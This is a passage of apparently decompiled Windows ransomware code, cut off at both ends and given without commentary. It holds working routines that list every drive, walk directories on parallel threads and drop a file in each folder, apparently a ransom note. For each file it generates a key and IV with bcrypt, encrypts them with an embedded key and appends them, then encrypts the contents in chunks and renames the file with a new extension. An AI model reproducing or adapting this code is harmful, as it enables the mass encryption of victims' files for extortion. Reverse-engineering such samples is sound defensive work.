  {
    v13 = a1;
    do
    {
      if ( v12 == 16 )
      {
        v24 = *a4;
        sub_401000((unsigned __int8 *)&v24, (int)v22);
        v14 = 15;
        while ( 1 )
        {
          v15 = *((_BYTE *)a4 + v14);
          if ( v15 != -1 )
            break;
          *((_BYTE *)a4 + v14--) = 0;
          if ( v14 < 0 )
            goto LABEL_13;
        }
        *((_BYTE *)a4 + v14) = v15 + 1;
LABEL_13:
        v13 = a1;
        v12 = 0;
      }
      v16 = *((_BYTE *)&v24 + v12++);
      *(_BYTE *)(v13 + v11++) ^= v16;
    }
    while ( v11 < a2 );
  }
  result = (_BYTE)a4 + 15;
  if ( a5 > (__int128 *)((char *)a4 + 15) || (__int128 *)((char *)a5 + 15) < a4 )
  {
    *a5 = *a4;
  }
  else
  {
    v18 = 16;
    do
    {
      result = *((_BYTE *)v6 + (char *)a4 - (char *)a5);
      v6 = (__int128 *)((char *)v6 + 1);
      *((_BYTE *)v6 - 1) = result;
      --v18;
    }
    while ( v18 );
  }
  return result;
}

//----- (00401480) --------------------------------------------------------
void *sub_401480()
{
  return &unk_41E2C8;
}

//----- (00401490) --------------------------------------------------------
int sub_401490(int a1, ...)
{
  int *v1; // eax
  FILE *v3; // [esp-10h] [ebp-18h]
  va_list va; // [esp+14h] [ebp+Ch] BYREF

  va_start(va, a1);
  v3 = __acrt_iob_func(1u);
  v1 = (int *)sub_401480();
  return sub_40776C(*v1, v1[1], (int)v3, a1, 0, (int)va);
}

//----- (004014D0) --------------------------------------------------------
BOOL __thiscall sub_4014D0(_WORD *this)
{
  int v2; // edx
  int v3; // eax
  int v4; // ecx
  HANDLE ProcessHeap; // eax
  const WCHAR *v6; // edi
  const WCHAR *v7; // edx
  WCHAR v8; // ax
  _WORD *v9; // ebx
  const WCHAR *v10; // ecx
  const WCHAR *v11; // edx
  const WCHAR *v13; // ecx
  WCHAR v14; // ax
  const WCHAR *v15; // ecx
  _WORD *v16; // edi
  const WCHAR *v17; // edx
  const WCHAR *v19; // ecx
  WCHAR v20; // ax
  int v21; // edx
  int v22; // ecx
  int v23; // eax
  WCHAR *v24; // edi
  HANDLE FileW; // esi
  HANDLE v26; // eax
  const WCHAR *v28; // [esp-1Ch] [ebp-2Ch]
  SIZE_T v29; // [esp-4h] [ebp-14h]
  LPCWSTR lpFileName; // [esp+8h] [ebp-8h] BYREF

  v2 = 0;
  if ( *this )
  {
    do
      ++v2;
    while ( this[v2] );
  }
  v3 = 0;
  if ( *(_WORD *)dword_41E2E4 )
  {
    do
      ++v3;
    while ( *(_WORD *)(dword_41E2E4 + 2 * v3) );
  }
  v4 = 0;
  if ( *(_WORD *)dword_41E2E8 )
  {
    do
      ++v4;
    while ( *(_WORD *)(dword_41E2E8 + 2 * v4) );
  }
  v29 = 2 * (v2 + v4 + v3) + 2;
  ProcessHeap = GetProcessHeap();
  v6 = (const WCHAR *)HeapAlloc(ProcessHeap, 0, v29);
  lpFileName = v6;
  v7 = v6 - 1;
  do
  {
    v8 = v7[this - v6 + 1];
    *++v7 = v8;
  }
  while ( v8 );
  v9 = (_WORD *)dword_41E2E4;
  v10 = v6;
  v11 = (const WCHAR *)dword_41E2E4;
  while ( *v10++ )
    ;
  v13 = v10 - 2;
  do
  {
    v14 = *v11;
    *++v13 = *v11++;
  }
  while ( v14 );
  v15 = v6;
  v16 = (_WORD *)dword_41E2E8;
  v17 = (const WCHAR *)dword_41E2E8;
  while ( *v15++ )
    ;
  v19 = v15 - 2;
  do
  {
    v20 = *v17;
    *++v19 = *v17++;
  }
  while ( v20 );
  v21 = 0;
  if ( *this )
  {
    do
      ++v21;
    while ( this[v21] );
  }
  v22 = 0;
  if ( *v9 )
  {
    do
      ++v22;
    while ( v9[v22] );
  }
  v23 = 0;
  if ( *v16 )
  {
    do
      ++v23;
    while ( v16[v23] );
  }
  v24 = (WCHAR *)lpFileName;
  v28 = lpFileName;
  lpFileName[v21 + v22 + v23] = 0;
  FileW = CreateFileW(v28, 0xC0000000, 0, 0, 2u, 0, 0);
  if ( FileW )
  {
    lpFileName = 0;
    WriteFile(FileW, lpBuffer, dwBytes, (LPDWORD)&lpFileName, 0);
    CloseHandle(FileW);
  }
  v26 = GetProcessHeap();
  return HeapFree(v26, 0, v24);
}
// 41E2E4: using guessed type int dword_41E2E4;
// 41E2E8: using guessed type int dword_41E2E8;

//----- (00401660) --------------------------------------------------------
HANDLE __thiscall sub_401660(WCHAR *this)
{
  const WCHAR *v1; // esi
  __int16 *v2; // edx
  __int16 v3; // ax
  WCHAR *v4; // ecx
  const wchar_t *v5; // edx
  WCHAR *v7; // ecx
  wchar_t v8; // ax
  HANDLE result; // eax
  void (__stdcall *v10)(HANDLE, DWORD, LPVOID); // ebx
  HANDLE (__stdcall *v11)(); // edi
  WCHAR *v12; // ecx
  WCHAR v13; // ax
  WCHAR *v14; // ecx
  WCHAR *cFileName; // edx
  WCHAR *v17; // ecx
  WCHAR v18; // ax
  WCHAR *v19; // ecx
  const wchar_t *v20; // edx
  WCHAR *v22; // ecx
  wchar_t v23; // ax
  _BYTE *v24; // edx
  int v25; // eax
  char *v26; // edi
  int v27; // eax
  int v28; // ecx
  char v29; // bl
  int v30; // edx
  int v31; // ecx
  HANDLE ProcessHeap; // eax
  HANDLE v33; // eax
  WCHAR *v34; // ecx
  WCHAR *v35; // esi
  WCHAR v36; // dx
  WCHAR v37; // ax
  _BYTE *v38; // edx
  int v39; // eax
  char *v40; // edi
  int v41; // eax
  int v42; // ecx
  char v43; // bl
  int v44; // edx
  int v45; // ecx
  _WORD *v46; // eax
  WCHAR *v47; // edi
  char *v48; // esi
  int v49; // ecx
  WCHAR v50; // cx
  HANDLE v51; // eax
  HANDLE v52; // eax
  HANDLE v53; // eax
  void *v54; // [esp-4h] [ebp-8A4h]
  void *v55; // [esp-4h] [ebp-8A4h]
  _BYTE *lpMem; // [esp+10h] [ebp-890h]
  unsigned int v57; // [esp+14h] [ebp-88Ch]
  int v58; // [esp+14h] [ebp-88Ch]
  int v59; // [esp+18h] [ebp-888h]
  unsigned int v60; // [esp+18h] [ebp-888h]
  int v61; // [esp+1Ch] [ebp-884h]
  unsigned int v62; // [esp+1Ch] [ebp-884h]
  unsigned int v63; // [esp+20h] [ebp-880h]
  int v64; // [esp+20h] [ebp-880h]
  HANDLE hFindFile; // [esp+24h] [ebp-87Ch]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+30h] [ebp-870h] BYREF
  WCHAR String1[259]; // [esp+280h] [ebp-620h] BYREF
  __int16 v69; // [esp+486h] [ebp-41Ah] BYREF
  WCHAR FileName[260]; // [esp+488h] [ebp-418h] BYREF
  WCHAR v71[262]; // [esp+690h] [ebp-210h] BYREF

  v1 = this;
  sub_4014D0(this);
  v2 = &v69;
  do
  {
    v3 = v2[v1 - FileName + 1];
    *++v2 = v3;
  }
  while ( v3 );
  v4 = FileName;
  v5 = L"*.*";
  while ( *v4++ )
    ;
  v7 = v4 - 2;
  do
  {
    v8 = *v5;
    *++v7 = *v5++;
  }
  while ( v8 );
  result = FindFirstFileW(FileName, &FindFileData);
  hFindFile = result;
  if ( result != (HANDLE)-1 )
  {
    v10 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    v11 = GetProcessHeap;
    do
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        v12 = &FindFileData.cAlternateFileName[13];
        do
        {
          v13 = v12[v1 - String1 + 1];
          *++v12 = v13;
        }
        while ( v13 );
        v14 = String1;
        cFileName = FindFileData.cFileName;
        while ( *v14++ )
          ;
        v17 = v14 - 2;
        do
        {
          v18 = *cFileName;
          *++v17 = *cFileName++;
        }
        while ( v18 );
        v19 = String1;
        v20 = L"\\";
        while ( *v19++ )
          ;
        v22 = v19 - 2;
        do
        {
          v23 = *v20;
          *++v22 = *v20++;
        }
        while ( v23 );
        v24 = sub_403EE0(FindFileData.cFileName);
        v57 = 0;
        lpMem = v24;
        v63 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 80) + 8);
        if ( v63 )
        {
          v25 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 80) + 12);
          v59 = v25;
          while ( 1 )
          {
            v26 = *(char **)(*(_DWORD *)v25 + 12);
            v27 = v24 - v26;
            v61 = v24 - v26;
            while ( 1 )
            {
              v28 = *v26;
              v29 = v26[v27];
              v30 = v28 + 32;
              if ( (unsigned int)(v28 - 65) > 0x19 )
                v30 = *v26;
              v31 = v29 + 32;
              if ( (unsigned int)(v29 - 65) > 0x19 )
                v31 = v29;
              if ( v31 != v30 )
                break;
              if ( !v29 )
                goto LABEL_65;
              v27 = v61;
              ++v26;
            }
            v25 = v59 + 4;
            ++v57;
            v59 += 4;
            if ( v57 >= v63 )
              break;
            v24 = lpMem;
          }
          v11 = GetProcessHeap;
          ProcessHeap = GetProcessHeap();
          v10 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
          HeapFree(ProcessHeap, 0, lpMem);
        }
        else
        {
          v54 = v24;
          v33 = v11();
          v10(v33, 0, v54);
        }
        sub_401490((int)"%S\n", String1);
        sub_401660(String1);
      }
      else
      {
        lstrcpyW(String1, v1);
        lstrcatW(String1, FindFileData.cFileName);
        v34 = FindFileData.cFileName;
        v35 = 0;
        if ( FindFileData.cFileName[0] )
        {
          v36 = FindFileData.cFileName[0];
          do
          {
            if ( v36 == 92 || v36 == 32 )
            {
              v35 = 0;
            }
            else if ( v36 == 46 )
            {
              v35 = v34;
            }
            v37 = v34[1];
            ++v34;
            v36 = v37;
          }
          while ( v37 );
        }
        if ( v35 )
          v34 = v35;
        lstrcpyW(v71, v34);
        v38 = sub_403EE0(v71);
        v60 = 0;
        lpMem = v38;
        v62 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 68) + 8);
        if ( v62 )
        {
          v39 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 68) + 12);
          v58 = v39;
          while ( 2 )
          {
            v40 = *(char **)(*(_DWORD *)v39 + 12);
            v41 = v38 - v40;
            v64 = v38 - v40;
            while ( 1 )
            {
              v42 = *v40;
              v43 = v40[v41];
              v44 = v42 + 32;
              if ( (unsigned int)(v42 - 65) > 0x19 )
                v44 = *v40;
              v45 = v43 + 32;
              if ( (unsigned int)(v43 - 65) > 0x19 )
                v45 = v43;
              if ( v45 != v44 )
                break;
              if ( !v43 )
                goto LABEL_65;
              v41 = v64;
              ++v40;
            }
            v46 = (_WORD *)dword_41E2E4;
            v47 = FindFileData.cFileName;
            if ( !*(_WORD *)dword_41E2E4 )
              goto LABEL_65;
            if ( FindFileData.cFileName[0] )
            {
              v48 = (char *)FindFileData.cFileName - dword_41E2E4;
              while ( 1 )
              {
                v49 = (unsigned __int16)*v46;
                if ( !(_WORD)v49 )
                  break;
                if ( *(unsigned __int16 *)((char *)v46 + (_DWORD)v48) == v49 )
                {
                  if ( *(_WORD *)((char *)++v46 + (_DWORD)v48) )
                    continue;
                }
                if ( !*v46 )
                  break;
                v50 = v47[1];
                ++v47;
                v46 = (_WORD *)dword_41E2E4;
                v48 += 2;
                if ( !v50 )
                  goto LABEL_63;
              }
LABEL_65:
              v11 = GetProcessHeap;
              v52 = GetProcessHeap();
              v10 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
              HeapFree(v52, 0, lpMem);
              goto LABEL_68;
            }
LABEL_63:
            v39 = v58 + 4;
            ++v60;
            v38 = lpMem;
            v58 += 4;
            if ( v60 < v62 )
              continue;
            break;
          }
          v11 = GetProcessHeap;
          v51 = GetProcessHeap();
          v10 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
          HeapFree(v51, 0, lpMem);
        }
        else
        {
          v55 = v38;
          v53 = v11();
          v10(v53, 0, v55);
        }
        sub_401A90(String1);
      }
LABEL_68:
      v1 = this;
    }
    while ( FindNextFileW(hFindFile, &FindFileData) );
    return (HANDLE)FindClose(hFindFile);
  }
  return result;
}
// 41A824: using guessed type wchar_t asc_41A824[4];
// 41A82C: using guessed type wchar_t asc_41A82C[2];
// 41E2E4: using guessed type int dword_41E2E4;
// 41E2EC: using guessed type int dword_41E2EC;

//----- (00401A90) --------------------------------------------------------
HANDLE __thiscall sub_401A90(const WCHAR *this)
{
  HANDLE result; // eax
  void *v2; // ebx
  SIZE_T v3; // ecx
  HANDLE ProcessHeap; // eax
  HANDLE v5; // eax
  HANDLE v6; // eax
  __int128 *v7; // eax
  int v8; // ecx
  char *v9; // edx
  int v10; // esi
  char v11; // al
  HMODULE LibraryW; // edx
  FARPROC ProcAddress; // eax
  HMODULE v14; // edx
  FARPROC v15; // eax
  int v16; // esi
  HANDLE v17; // eax
  LPVOID v18; // eax
  HMODULE v19; // edx
  FARPROC v20; // eax
  HANDLE v21; // eax
  LPVOID v22; // eax
  HMODULE v23; // edx
  FARPROC v24; // eax
  HANDLE v25; // eax
  LPVOID v26; // eax
  HMODULE v27; // edx
  FARPROC v28; // eax
  DWORD v29; // eax
  LONG HighPart; // ecx
  DWORD LowPart; // eax
  LONG v32; // edi
  unsigned int v33; // esi
  unsigned __int64 v34; // kr00_8
  DWORD v35; // kr08_4
  void (__stdcall *v36)(HANDLE, DWORD, LPVOID); // esi
  HANDLE v37; // eax
  HANDLE v38; // eax
  HANDLE v39; // eax
  HANDLE v40; // eax
  HANDLE v41; // eax
  HANDLE v42; // eax
  _WORD *v43; // ecx
  __int16 v44; // ax
  WCHAR *v45; // ecx
  const char *v46; // edx
  WCHAR *v48; // ecx
  WCHAR v49; // ax
  WCHAR *v50; // edx
  WCHAR *v51; // ecx
  WCHAR *v53; // ecx
  WCHAR v54; // ax
  HANDLE v55; // eax
  void *v56; // ebx
  HANDLE v57; // eax
  SIZE_T v58; // [esp+88h] [ebp-4964Ch]
  DWORD v59; // [esp+88h] [ebp-4964Ch]
  char *lpMem; // [esp+98h] [ebp-4963Ch]
  __int128 *v61; // [esp+9Ch] [ebp-49638h]
  LPCVOID v62; // [esp+A0h] [ebp-49634h]
  void *v63; // [esp+A0h] [ebp-49634h]
  HANDLE hFile; // [esp+A4h] [ebp-49630h]
  char *v65; // [esp+A8h] [ebp-4962Ch]
  int liDistanceToMove; // [esp+ACh] [ebp-49628h]
  void *lpBuffer; // [esp+B4h] [ebp-49620h]
  void *v68; // [esp+B8h] [ebp-4961Ch]
  int v69; // [esp+BCh] [ebp-49618h]
  LARGE_INTEGER FileSize; // [esp+C4h] [ebp-49610h] BYREF
  int v72; // [esp+D0h] [ebp-49604h] BYREF
  int v73; // [esp+D4h] [ebp-49600h] BYREF
  int v74; // [esp+D8h] [ebp-495FCh] BYREF
  DWORD NumberOfBytesWritten; // [esp+DCh] [ebp-495F8h] BYREF
  DWORD NumberOfBytesRead; // [esp+E0h] [ebp-495F4h] BYREF
  WCHAR NewFileName[260]; // [esp+E4h] [ebp-495F0h] BYREF
  char Buffer[300004]; // [esp+2ECh] [ebp-493E8h] BYREF

  NumberOfBytesRead = 0;
  result = CreateFileW(this, 0xC0000000, 0, 0, 3u, 0, 0);
  v2 = result;
  hFile = result;
  if ( result )
  {
    GetFileSizeEx(result, &FileSize);
    v3 = 0;
    if ( *(_BYTE *)dword_41E2DC )
    {
      do
        ++v3;
      while ( *(_BYTE *)(dword_41E2DC + v3) );
    }
    v58 = v3;
    ProcessHeap = GetProcessHeap();
    v65 = (char *)HeapAlloc(ProcessHeap, 0, v58);
    v5 = GetProcessHeap();
    lpMem = (char *)HeapAlloc(v5, 0, 0x10u);
    v6 = GetProcessHeap();
    v7 = (__int128 *)HeapAlloc(v6, 0, 0x10u);
    v8 = 0;
    v61 = v7;
    if ( *(_BYTE *)dword_41E2DC )
    {
      do
        ++v8;
      while ( *(_BYTE *)(dword_41E2DC + v8) );
    }
    v9 = v65;
    if ( v8 )
    {
      v10 = dword_41E2DC - (_DWORD)v65;
      do
      {
        v11 = (v9++)[v10];
        *(v9 - 1) = v11;
        --v8;
      }
      while ( v8 );
    }
    LibraryW = hModule;
    if ( !hModule )
    {
      LibraryW = LoadLibraryW(L"bcrypt.dll");
      hModule = LibraryW;
    }
    ProcAddress = (FARPROC)dword_41E314;
    if ( !dword_41E314 )
    {
      ProcAddress = GetProcAddress(
                      LibraryW,
                      *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 12)
                                + 12));
      dword_41E314 = (int)ProcAddress;
    }
    ((void (__stdcall *)(_DWORD, char *, int, int))ProcAddress)(0, lpMem, 16, 2);
    v14 = hModule;
    if ( !hModule )
    {
      v14 = LoadLibraryW(L"bcrypt.dll");
      hModule = v14;
    }
    v15 = (FARPROC)dword_41E314;
    if ( !dword_41E314 )
    {
      v15 = GetProcAddress(
              v14,
              *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 12) + 12));
      dword_41E314 = (int)v15;
    }
    ((void (__stdcall *)(_DWORD, __int128 *, int, int))v15)(0, v61, 16, 2);
    v16 = 0;
    if ( *(_BYTE *)dword_41E2DC )
    {
      do
        ++v16;
      while ( *(_BYTE *)(dword_41E2DC + v16) );
    }
    v74 = 256;
    v17 = GetProcessHeap();
    v18 = HeapAlloc(v17, 0, 0x100u);
    v19 = dword_41E320;
    v68 = v18;
    v72 = v74;
    v73 = dword_41E2D0;
    if ( !dword_41E320 )
    {
      v19 = LoadLibraryW(L"bcrypt.dll");
      dword_41E320 = v19;
    }
    v20 = (FARPROC)dword_41E334;
    if ( !dword_41E334 )
    {
      v20 = GetProcAddress(
              v19,
              *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 20) + 12));
      dword_41E334 = (int)v20;
    }
    ((void (__stdcall *)(int, char *, int, _DWORD, _DWORD, _DWORD, void *, int, int *, int))v20)(
      v73,
      v65,
      v16,
      0,
      0,
      0,
      v68,
      v72,
      &v74,
      2);
    v73 = 256;
    v21 = GetProcessHeap();
    v22 = HeapAlloc(v21, 0, 0x100u);
    v23 = dword_41E320;
    lpBuffer = v22;
    v72 = v73;
    v62 = (LPCVOID)dword_41E2D0;
    if ( !dword_41E320 )
    {
      v23 = LoadLibraryW(L"bcrypt.dll");
      dword_41E320 = v23;
    }
    v24 = (FARPROC)dword_41E334;
    if ( !dword_41E334 )
    {
      v24 = GetProcAddress(
              v23,
              *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 20) + 12));
      dword_41E334 = (int)v24;
    }
    ((void (__stdcall *)(LPCVOID, char *, int, _DWORD, _DWORD, _DWORD, void *, int, int *, int))v24)(
      v62,
      lpMem,
      16,
      0,
      0,
      0,
      lpBuffer,
      v72,
      &v73,
      2);
    v72 = 256;
    v25 = GetProcessHeap();
    v26 = HeapAlloc(v25, 0, 0x100u);
    v27 = dword_41E320;
    v63 = v26;
    v69 = v72;
    liDistanceToMove = dword_41E2D0;
    if ( !dword_41E320 )
    {
      v27 = LoadLibraryW(L"bcrypt.dll");
      dword_41E320 = v27;
    }
    v28 = (FARPROC)dword_41E334;
    if ( !dword_41E334 )
    {
      v28 = GetProcAddress(
              v27,
              *(LPCSTR *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(dword_41E2EC + 12) + 92) + 12) + 20) + 12));
      dword_41E334 = (int)v28;
    }
    ((void (__stdcall *)(int, __int128 *, int, _DWORD, _DWORD, _DWORD, void *, int, int *, int))v28)(
      liDistanceToMove,
      v61,
      16,
      0,
      0,
      0,
      v63,
      v69,
      &v72,
      2);
    SetFilePointerEx(v2, FileSize, 0, 0);
    SetLastError(0);
    WriteFile(v2, lpBuffer, 0x100u, &NumberOfBytesWritten, 0);
    if ( GetLastError() != 6 && GetLastError() != 19 )
    {
      SetFilePointerEx(v2, (LARGE_INTEGER)(FileSize.QuadPart + 256), 0, 0);
      WriteFile(v2, v63, 0x100u, &NumberOfBytesWritten, 0);
      SetFilePointerEx(v2, (LARGE_INTEGER)(FileSize.QuadPart + 512), 0, 0);
      v29 = 0;
      if ( *(_BYTE *)dword_41E2DC )
      {
        do
          ++v29;
        while ( *(_BYTE *)(v29 + dword_41E2DC) );
      }
      WriteFile(v2, v65, v29, &NumberOfBytesWritten, 0);
      HighPart = FileSize.HighPart;
      LowPart = FileSize.LowPart;
      if ( FileSize.QuadPart <= 1200000 )
      {
        v59 = FileSize.LowPart;
        v55 = GetProcessHeap();
        v56 = HeapAlloc(v55, 0, v59);
        SetFilePointerEx(hFile, 0i64, 0, 0);
        ReadFile(hFile, v56, FileSize.LowPart, &NumberOfBytesRead, 0);
        sub_401250((int)v56, FileSize.LowPart, lpMem, v61, v61);
        SetFilePointerEx(hFile, 0i64, 0, 0);
        WriteFile(hFile, v56, FileSize.LowPart, &NumberOfBytesWritten, 0);
        v57 = GetProcessHeap();
        v36 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
        HeapFree(v57, 0, v56);
        v2 = hFile;
LABEL_45:
        v37 = GetProcessHeap();
        v36(v37, 0, v65);
        v38 = GetProcessHeap();
        v36(v38, 0, lpMem);
        v39 = GetProcessHeap();
        v36(v39, 0, v61);
        v40 = GetProcessHeap();
        v36(v40, 0, lpBuffer);
        v41 = GetProcessHeap();
        v36(v41, 0, v63);
        v42 = GetProcessHeap();
        v36(v42, 0, v68);
        CloseHandle(v2);
        v43 = (_WORD *)&NumberOfBytesRead + 1;
        do
        {
          v44 = v43[this - NewFileName + 1];
          *++v43 = v44;
        }
        while ( v44 );
        v45 = NewFileName;
        v46 = ".";
        while ( *v45++ )
          ;
        v48 = v45 - 2;
        do
        {
          v49 = *(_WORD *)v46;
          *++v48 = *(_WORD *)v46;
          v46 += 2;
        }
        while ( v49 );
        v50 = (WCHAR *)dword_41E2E4;
        v51 = NewFileName;
        while ( *v51++ )
          ;
        v53 = v51 - 2;
        do
        {
          v54 = *v50;
          *++v53 = *v50++;
        }
        while ( v54 );
        return (HANDLE)MoveFileW(this, NewFileName);
      }
      v32 = 0;
      v33 = 0;
      while ( 1 )
      {
        v34 = __PAIR64__(HighPart, LowPart) - __PAIR64__(v32, v33);
        if ( (((__PAIR64__(HighPart, LowPart) - __PAIR64__(v32, v33)) >> 32) & 0x80000000) != 0i64
          || (__SPAIR64__(HighPart, LowPart) < __SPAIR64__(v32, v33) || HIDWORD(v34) == 0)
          && (unsigned int)v34 < 0x493E0 )
        {
          break;
        }
        SetFilePointerEx(v2, (LARGE_INTEGER)__PAIR64__(v32, v33), 0, 0);
        ReadFile(v2, Buffer, 0x493E0u, &NumberOfBytesRead, 0);
        sub_401250((int)Buffer, 0x493E0u, lpMem, v61, v61);
        SetFilePointerEx(v2, (LARGE_INTEGER)__PAIR64__(v32, v33), 0, 0);
        WriteFile(v2, Buffer, 0x493E0u, &NumberOfBytesWritten, 0);
        HighPart = FileSize.HighPart;
        v35 = v33 + 500000;
        v32 = (__PAIR64__(v32, v33) + 500000) >> 32;
        v33 += 500000;
        if ( v32 >= FileSize.HighPart )
        {
          if ( v32 > FileSize.HighPart )
            break;
          LowPart = FileSize.LowPart;
          if ( v35 >= FileSize.LowPart )
            break;
        }
        else
        {
          LowPart = FileSize.LowPart;
        }
      }
    }
    v36 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    goto LABEL_45;
  }
  return result;
}
// 401ECE: conditional instruction was optimized away because %FileSize@4.4>=0
// 401ED8: conditional instruction was optimized away because %FileSize.4>=124F81u
// 41E2D0: using guessed type int dword_41E2D0;
// 41E2DC: using guessed type int dword_41E2DC;
// 41E2E4: using guessed type int dword_41E2E4;
// 41E2EC: using guessed type int dword_41E2EC;
// 41E314: using guessed type int dword_41E314;
// 41E334: using guessed type int dword_41E334;

//----- (00402160) --------------------------------------------------------
DWORD __stdcall StartAddress(int *lpThreadParameter)
{
  int v1; // eax
  int v3[2]; // [esp+4h] [ebp-Ch] BYREF

  v1 = *lpThreadParameter;
  v3[1] = lpThreadParameter[1];
  v3[0] = v1;
  sub_401660((WCHAR *)v3);
  return 0;
}

//----- (004021A0) --------------------------------------------------------
void sub_4021A0()
{
  int v0; // esi
  int i; // ebx
  UINT DriveTypeW; // edi
  HANDLE ProcessHeap; // eax
  char *v4; // eax
  UINT v5; // edi
  int j; // edi
  HANDLE hHandle[26]; // [esp+Ch] [ebp-74h]
  WCHAR RootPathName; // [esp+74h] [ebp-Ch] BYREF
  int v9; // [esp+76h] [ebp-Ah]
  __int16 v10; // [esp+7Ah] [ebp-6h]

  v0 = 0;
  for ( i = 0; i < 26; ++i )
  {
    v9 = 6029370;
    RootPathName = i + 65;
    v10 = 0;
    DriveTypeW = GetDriveTypeW(&RootPathName);
    ProcessHeap = GetProcessHeap();
    v4 = (char *)HeapAlloc(ProcessHeap, 0, 4u);
    v5 = DriveTypeW - 2;
    if ( !v5 || v5 - 1 <= 1 )
    {
      *(_WORD *)v4 = RootPathName;
      *(_DWORD *)(v4 + 2) = v9;
      *((_WORD *)v4 + 3) = v10;
      hHandle[v0] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, 0);
      Sleep(0x1F4u);
      ++v0;
    }
  }
  for ( j = 0; j < v0; ++j )
    WaitForSingleObject(hHandle[j], 0xFFFFFFFF);
}
// 4021A0: using guessed type HANDLE hHandle[26];

//----- (00402280) --------------------------------------------------------
int __fastcall sub_402280(int a1, unsigned int a2)
{
  unsigned int v3; // edi
  bool v4; // zf
  unsigned int v5; // edx
  int v6; // esi
  int v7; // esi

  if ( !a2 )
    return 1;
  v3 = a2 >> 1;
  v4 = (a2 & 1) == 0;
  v5 = a2 >> 1;
  if ( v4 )
  {
    v6 = sub_402280(10, v5);
    return v6 * sub_402280(10, v3);
  }
  else
  {
    v7 = sub_402280(10, v5);
    return 10 * v7 * sub_402280(10, v3);
  }
}

//----- (004022E0) --------------------------------------------------------
char __fastcall sub_4022E0(char a1)
{
  int v1; // eax
  unsigned int v2; // ecx
  char result; // al

  v1 = a1;
  v2 = a1 - 48;
  if ( v2 <= 9 && v1 )
    return v2;
  switch ( v1 )
  {
    case 'A':
    case 'a':
      result = 10;
      break;
    case 'B':
    case 'b':
      result = 11;
      break;
    case 'C':
    case 'c':
      result = 12;
      break;
    case 'D':
    case 'd':
      result = 13;
      break;
    case 'E':
    case 'e':
      result = 14;
      break;
    case 'F':
    case 'f':
      result = 15;
      break;
    default:
      result = -1;
      break;
  }
  return result;
}

//----- (00402370) --------------------------------------------------------
void *__cdecl sub_402370(SIZE_T dwBytes, int a2)
{
  HANDLE ProcessHeap; // eax
  void *result; // eax
  void *v4; // edi
  HANDLE v5; // eax

  if ( a2 )
  {
    ProcessHeap = GetProcessHeap();
    result = HeapAlloc(ProcessHeap, 0, dwBytes);
    v4 = result;
    if ( result )
    {
      if ( dwBytes )
        memset(result, 0, dwBytes);
      return v4;
    }
  }
  else
  {
    v5 = GetProcessHeap();
    return HeapAlloc(v5, 0, dwBytes);
  }
  return result;
}

//----- (004023D0) --------------------------------------------------------
BOOL __cdecl sub_4023D0(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}

//----- (004023F0) --------------------------------------------------------
int __fastcall sub_4023F0(unsigned int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5)
{
  _DWORD *v6; // edi
  unsigned int v7; // edx
  unsigned int v8; // ebx
  int result; // eax
  unsigned int v10; // esi
  int v11; // eax
  int v12; // edx
  int v13; // eax
  int v14; // esi
  unsigned int v15; // edx
  unsigned int v16; // ebx
  unsigned int v17; // eax
  int v18; // eax
  unsigned int v19; // edx
  unsigned int v20; // edi
  unsigned int v21; // esi
  _DWORD *v22; // ecx

  if ( a1[9] )
  {
    v19 = a1[8] + 24;
    v20 = *a1;
    if ( a1[2] - *a1 < v19 )
      return 0;
    v21 = a1[3];
    if ( v21 )
    {
      *a1 = v20 + v19;
      if ( v20 + v19 > v21 )
        return 0;
    }
    v22 = (_DWORD *)((int (__cdecl *)(unsigned int, int, unsigned int))a1[5])(v19, 1, a1[7]);
    if ( !v22 )
      return 0;
    if ( !*a3 )
      *a3 = v22;
    v22[1] = a5;
    *v22 = *a2;
    if ( *(_DWORD *)a4 )
      *(_DWORD *)(*(_DWORD *)a4 + 16) = v22;
    *a2 = v22;
    result = 1;
    *(_DWORD *)a4 = v22;
  }
  else
  {
    v6 = *(_DWORD **)a4;
    *a2 = *(_DWORD *)a4;
    *(_DWORD *)a4 = v6[4];
    if ( !*a3 )
      *a3 = v6;
    switch ( v6[1] )
    {
      case 1:
        v13 = v6[2];
        if ( v13 )
        {
          v14 = 12 * v13;
          v15 = 12 * v13 + v6[3];
          if ( a1[2] - *a1 < v15 )
            goto LABEL_9;
          v16 = a1[3];
          if ( v16 )
          {
            v17 = v15 + *a1;
            *a1 = v17;
            if ( v17 > v16 )
              goto LABEL_9;
          }
          v18 = ((int (__cdecl *)(unsigned int, _DWORD, unsigned int))a1[5])(v15, 0, a1[7]);
          v6[3] = v18;
          if ( !v18 )
            return 0;
          v6[2] = 0;
          v6[4] = v14 + v18;
        }
        break;
      case 2:
        v12 = v6[2];
        if ( v12 )
        {
          v7 = 4 * v12;
          goto LABEL_8;
        }
        break;
      case 5:
        v7 = v6[2] + 1;
LABEL_8:
        v8 = *a1;
        if ( a1[2] - *a1 >= v7 )
        {
          v10 = a1[3];
